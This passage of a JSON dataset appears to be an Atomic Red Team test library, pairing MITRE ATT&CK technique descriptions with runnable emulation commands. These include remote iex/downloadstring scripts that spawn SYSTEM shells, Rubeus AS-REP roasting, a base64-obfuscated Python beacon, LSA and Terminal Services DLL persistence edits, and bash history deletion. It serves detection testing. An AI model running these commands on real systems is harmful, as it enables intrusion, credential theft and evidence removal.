"dependency_executor_name": "powershell", "dependencies": [{"description": "AtomicRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\\#{dll_name})\n", "prereq_command": "if (Test-Path \"#{dll_path}\\#{dll_name}\") {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll\" -OutFile \"#{dll_path}\\#{dll_name}\"\n"}], "executor": {"command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\n$passwordFilterName = (Copy-Item \"#{dll_path}\\#{dll_name}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\n", "cleanup_command": "reg.exe import \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\nremove-item C:\\Windows\\System32\\#{dll_name}\n", "name": "powershell", "elevation_required": true}}]}, "T1505.005": {"name": "Terminal Services DLL", "technique_id": "attack-pattern--379809f6-2fac-42c1-bd2e-e9dee70b27f8", "external_id": "T1505.005", "data_components": ["File Modification", "Windows Registry Key Modification", "Process Creation", "Module Load", "Command Execution"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--a2c36a5d-4058-475e-8e77-fff75e50d3b9", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)\n\n[Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a \"generic\" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation: Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\\System32\\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`.\n\nAdversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.", "atomic_tests": [{"name": "Simulate Patching termsrv.dll", "auto_generated_guid": "0b2eadeb-4a64-4449-9d43-3d999f4a317b", "description": "Simulates patching of termsrv.dll by making a benign change to the file and replacing it with the original afterwards.\nBefore we can make the modifications we need to take ownership of the file and grant ourselves the necessary permissions.\n", "supported_platforms": ["windows"], "executor": {"elevation_required": true, "command": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n$ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\nCopy-Item -Path \"C:\\Windows\\System32\\termsrv.dll\" -Destination \"C:\\Windows\\System32\\termsrv_backup.dll\" -ErrorAction Ignore\nAdd-Content -Path \"C:\\Windows\\System32\\termsrv.dll\" -Value \"`n\" -NoNewline -ErrorAction Ignore\nMove-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore\n", "cleanup_command": "Move-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Modify Terminal Services DLL Path", "auto_generated_guid": "18136e38-0530-49b2-b309-eed173787471", "description": "This atomic test simulates the modification of the ServiceDll value in HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters. This technique may be leveraged by adversaries to establish persistence by loading a patched version of the DLL containing malicious code.", "supported_platforms": ["windows"], "executor": {"elevation_required": true, "command": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n$ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\nCopy-Item -Path $termsrvDll -Destination \"$HOME\\AtomicTest.dll\"\n\n$newServiceDll = \"$HOME\\AtomicTest.dll\"\n\n$registryPath = \"HKLM:\\System\\CurrentControlSet\\services\\TermService\\Parameters\"\n\n# Check if the registry key exists\nif (Test-Path -Path $registryPath) {\n    # Modify the ServiceDll value in the registry\n    Set-ItemProperty -Path $registryPath -Name \"ServiceDll\" -Value $newServiceDll\n    Write-Host \"ServiceDll value in the registry has been updated to: $newServiceDll\"\n} else {\n    Write-Host \"Registry key not found. Make sure the 'TermService\\Parameters' key exists.\"\n}", "cleanup_command": "Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\services\\TermService\\Parameters\" -Name \"ServiceDll\" -Value \"C:\\Windows\\System32\\termsrv.dll\"", "name": "powershell"}}]}, "T1059.002": {"name": "AppleScript", "technique_id": "attack-pattern--37b11151-1776-4f8f-b328-30939fbf2ceb", "external_id": "T1059.002", "data_components": ["OS API Execution", "Command Execution", "Process Creation"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312"], "description": "Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)\n\nAppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s\u00a0<code>NSAppleScript</code>\u00a0or\u00a0<code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)", "atomic_tests": [{"name": "AppleScript", "auto_generated_guid": "3600d97d-81b9-4171-ab96-e4386506e2c2", "description": "Shell Script with AppleScript. The encoded python script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of \"t3VhVOs/DyCcDTFzIKanRxkvk3I=\", unless 'Little Snitch' is installed, in which case it will just exit. \nYou can use netcat to listen for the connection and verify execution, e.g. use \"nc -l 80\" in another terminal window before executing this test and watch for the request.\n\nReference: https://github.com/EmpireProject/Empire\n", "supported_platforms": ["macos"], "executor": {"command": "osascript -e \"do shell script \\\"echo \\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\\\\\" | python &\\\"\"\n", "name": "sh"}}]}, "T1176": {"name": "Browser Extensions", "technique_id": "attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8", "external_id": "T1176", "data_components": ["Process Creation", "Windows Registry Key Creation", "Command Execution", "File Creation", "Network Connection Creation"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--23843cff-f7b9-4659-a7b7-713ef347f547", "course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b"], "description": "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition)\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS)\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension)\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.(Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control.(Citation: Chrome Extension C2 Malware)", "atomic_tests": [{"name": "Chrome/Chromium (Developer Mode)", "auto_generated_guid": "3ecd790d-2617-4abf-9a8c-4e8d47da9ee1", "description": "Turn on Chrome/Chromium developer mode and Load Extension found in the src directory", "supported_platforms": ["linux", "windows", "macos"], "executor": {"steps": "1. Navigate to [chrome://extensions](chrome://extensions) and\ntick 'Developer Mode'.\n\n2. Click 'Load unpacked extension...' and navigate to\n[Browser_Extension](../t1176/src/)\n\n3. Click 'Select'\n", "name": "manual"}}, {"name": "Chrome/Chromium (Chrome Web Store)", "auto_generated_guid": "4c83940d-8ca5-4bb2-8100-f46dc914bc3f", "description": "Install the \"Minimum Viable Malicious Extension\" Chrome extension", "supported_platforms": ["linux", "windows", "macos"], "executor": {"steps": "1. Navigate to https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend\nin Chrome\n\n2. Click 'Add to Chrome'\n", "name": "manual"}}, {"name": "Firefox", "auto_generated_guid": "cb790029-17e6-4c43-b96f-002ce5f10938", "description": "Create a file called test.wma, with the duration of 30 seconds\n", "supported_platforms": ["linux", "windows", "macos"], "executor": {"steps": "1. Navigate to [about:debugging](about:debugging) and\nclick \"Load Temporary Add-on\"\n\n2. Navigate to [manifest.json](./src/manifest.json)\n\n3. Then click 'Open'\n", "name": "manual"}}, {"name": "Edge Chromium Addon - VPN", "auto_generated_guid": "3d456e2b-a7db-4af8-b5b3-720e7c4d9da5", "description": "Adversaries may use VPN extensions in an attempt to hide traffic sent from a compromised host. This will install one (of many) available VPNS in the Edge add-on store.\n", "supported_platforms": ["windows", "macos"], "executor": {"steps": "1. Navigate to https://microsoftedge.microsoft.com/addons/detail/fjnehcbecaggobjholekjijaaekbnlgj\nin Edge Chromium\n\n2. Click 'Get'\n", "name": "manual"}}, {"name": "Google Chrome Load Unpacked Extension With Command Line", "auto_generated_guid": "7a714703-9f6b-461c-b06d-e6aeac650f27", "description": "This test loads an unpacked extension in Google Chrome with the `--load-extension` parameter. This technique was previously used by the Grandoreiro malware to load a malicious extension that would capture the browsing history, steal cookies and other user information. Other malwares also leverage this technique to hijack searches, steal passwords, inject ads, and more.\n\nReferences:\nhttps://attack.mitre.org/techniques/T1176/\nhttps://securityintelligence.com/posts/grandoreiro-malware-now-targeting-banks-in-spain/", "supported_platforms": ["windows"], "input_arguments": {"working_dir": {"description": "Working directory where the files will be downloaded and extracted", "type": "string", "default": "$env:TEMP"}}, "executor": {"command": "\n# Chromium\n$chromium =  \"https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip\"\n\n# uBlock Origin Lite to test side-loading\n$extension = \"https://github.com/gorhill/uBlock/releases/download/uBOLite_0.1.23.6055/uBOLite_0.1.23.6055.chromium.mv3.zip\"\n\nSet-Location \"#{working_dir}\"\n\nSet-Variable ProgressPreference SilentlyContinue\nInvoke-WebRequest -URI $chromium -OutFile \"#{working_dir}\\chrome.zip\"\nInvoke-WebRequest -URI $extension -OutFile \"#{working_dir}\\extension.zip\"\n\n\nExpand-Archive chrome.zip -DestinationPath \"#{working_dir}\" -Force\nExpand-Archive extension.zip -Force\n\nStart-Process .\\chrome-win\\chrome.exe --load-extension=\"#{working_dir}\\extension\\\" -PassThru", "cleanup_command": "Set-Location \"#{working_dir}\"\nStop-Process -Name chrome -Force\nRemove-Item .\\chrome.zip, .\\chrome-win, .\\extension, .\\extension.zip -Recurse -Force\nSet-Variable ProgressPreference Continue", "name": "powershell", "elevation_required": true}}]}, "T1106": {"name": "Native API", "technique_id": "attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670", "external_id": "T1106", "data_components": ["Module Load", "OS API Execution"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46"], "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)).", "atomic_tests": [{"name": "Execution through API - CreateProcess", "auto_generated_guid": "99be2089-c52d-4a4a-b5c3-261ee42c8b62", "description": "Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.", "supported_platforms": ["windows"], "input_arguments": {"source_file": {"description": "Location of the CSharp source file to compile and execute", "type": "path", "default": "PathToAtomicsFolder\\T1106\\src\\CreateProcess.cs"}, "output_file": {"description": "Location of the payload", "type": "path", "default": "%tmp%\\T1106.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "#{source_file} must exist on system.\n", "prereq_command": "if (Test-Path \"#{source_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{source_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1106/src/CreateProcess.cs\" -OutFile \"#{source_file}\"\n"}], "executor": {"command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"#{output_file}\" /target:exe \"#{source_file}\"\n%tmp%/T1106.exe\n", "name": "command_prompt"}}, {"name": "WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique", "auto_generated_guid": "ce4e76e6-de70-4392-9efe-b281fc2b4087", "description": "Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')", "name": "powershell"}}, {"name": "WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique", "auto_generated_guid": "7ec5b74e-8289-4ff2-a162-b6f286a33abd", "description": "Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')", "name": "powershell"}}, {"name": "WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique", "auto_generated_guid": "e1f93a06-1649-4f07-89a8-f57279a7d60e", "description": "Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')", "name": "powershell"}}]}, "T1558.004": {"name": "AS-REP Roasting", "technique_id": "attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b", "external_id": "T1558.004", "data_components": ["Active Directory Credential Request"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)", "atomic_tests": [{"name": "Rubeus asreproast", "auto_generated_guid": "615bd568-2859-41b5-9aed-61f6a88e48dd", "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n", "supported_platforms": ["windows"], "input_arguments": {"local_folder": {"description": "Local path of Rubeus executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads"}, "local_executable": {"description": "name of the rubeus executable", "type": "string", "default": "rubeus.exe"}, "out_file": {"description": "file where command results are stored", "type": "string", "default": "rubeus_output.txt"}, "rubeus_url": {"description": "URL of Rubeus executable", "type": "url", "default": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}, {"description": "Rubeus must exist\n", "prereq_command": "if(Test-Path -Path \"#{local_folder}\\#{local_executable}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\\#{local_executable}\n"}], "executor": {"command": "cmd.exe /c \"#{local_folder}\\#{local_executable}\" asreproast /outfile:\"#{local_folder}\\#{out_file}\"\n", "cleanup_command": "Remove-Item \"#{local_folder}\\#{out_file}\" -ErrorAction Ignore\n", "name": "powershell", "elevation_required": false}}, {"name": "Get-DomainUser with PowerView", "auto_generated_guid": "d6139549-7b72-4e48-9ea1-324fc9bdf88a", "description": "Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\n", "name": "powershell"}}, {"name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus", "auto_generated_guid": "8c385f88-4d47-4c9a-814d-93d9deec8c71", "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"", "name": "powershell"}}]}, "T1070.003": {"name": "Clear Command History", "technique_id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a", "external_id": "T1070.003", "data_components": ["File Modification", "File Deletion", "Command Execution", "User Account Authentication"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--20a2baeb-98c2-4901-bad7-dc62d0a03dea", "course-of-action--609191bf-7d06-40e4-b1f8-9e11eb3ff8a6", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448"], "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)", "atomic_tests": [{"name": "Clear Bash history (rm)", "auto_generated_guid": "a934276e-2be5-4a36-93fd-98adbb5bd4fc", "description": "Clears bash history via rm\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "rm ~/.bash_history\n", "name": "sh"}}, {"name": "Clear sh history (rm)", "auto_generated_guid": "448893f8-1d5d-4ae2-9017-7fcd73a7e100", "description": "Clears sh history via rm\n", "supported_platforms": ["linux"], "executor": {"command": "rm ~/.sh_history\n", "name": "sh"}}, {"name": "Clear Bash history (echo)", "auto_generated_guid": "cbf506a5-dd78-43e5-be7e-a46b7c7a0a11", "description": "Clears bash history via echo\n", "supported_platforms": ["linux"], "executor": {"command": "echo \"\" > ~/.bash_history\n", "name": "sh"}}, {"name": "Clear sh history (echo)", "auto_generated_guid": "a4d63cb3-9ed9-4837-9480-5bf6b09a6c96", "description": "Clears sh history via echo\n", "supported_platforms": ["linux"], "executor": {"command": "echo \"\" > ~/.sh_history\n", "name": "sh"}}, {"name": "Clear Bash history (cat dev/null)", "auto_generated_guid": "b1251c35-dcd3-4ea1-86da-36d27b54f31f", "description": "Clears bash history via cat /dev/null\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "cat /dev/null > ~/.bash_history\n", "name": "sh"}}, {"name": "Clear sh history (cat dev/null)", "auto_generated_guid": "ecaefd53-6fa4-4781-ba51-d9d6fb94dbdc", "description": "Clears sh history via cat /dev/null\n", "supported_platforms": ["linux"], "executor": {"command": "cat /dev/null > ~/.sh_history\n", "name": "sh"}}, {"name": "Clear Bash history (ln dev/null)", "auto_generated_guid": "23d348f3-cc5c-4ba9-bd0a-ae09069f0914", "description": "Clears bash history via a symlink to /dev/null\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "ln -sf /dev/null ~/.bash_history\n", "name": "sh"}}, {"name": "Clear sh history (ln dev/null)", "auto_generated_guid": "3126aa7a-8768-456f-ae05-6ab2d4accfdd", "description": "Clears sh history via a symlink to /dev/null\n", "supported_platforms": ["linux"], "executor": {"command": "ln -sf /dev/null ~/.sh_history\n", "name": "sh"}}, {"name": "Clear Bash history (truncate)", "auto_generated_guid": "47966a1d-df4f-4078-af65-db6d9aa20739", "description": "Clears bash history via 